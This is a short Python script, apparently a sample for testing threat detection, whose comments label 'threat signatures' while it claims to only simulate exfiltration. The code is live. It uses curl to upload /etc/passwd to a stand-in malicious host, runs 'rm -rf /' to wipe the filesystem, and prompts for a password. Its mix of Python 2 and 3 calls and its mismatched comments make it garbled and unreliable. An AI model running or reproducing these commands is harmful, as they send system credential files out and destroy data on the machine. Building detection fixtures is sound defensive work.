import os
import subprocess

def exfiltrate_data():
    # OBVIOUS THREAT SIGNATURE: os.system with raw_input and data uploading pattern
    print("Simulating data exfiltration...")
    os.system("curl -X POST http://malicious-server.xyz/upload -d @/etc/passwd") 
    subprocess.run(["rm", "-rf", "/"]) # SYSTEM MODIFICATION
    x = raw_input("Enter password: ") # STEALTH_C2
    
if __name__ == "__main__":
    exfiltrate_data()
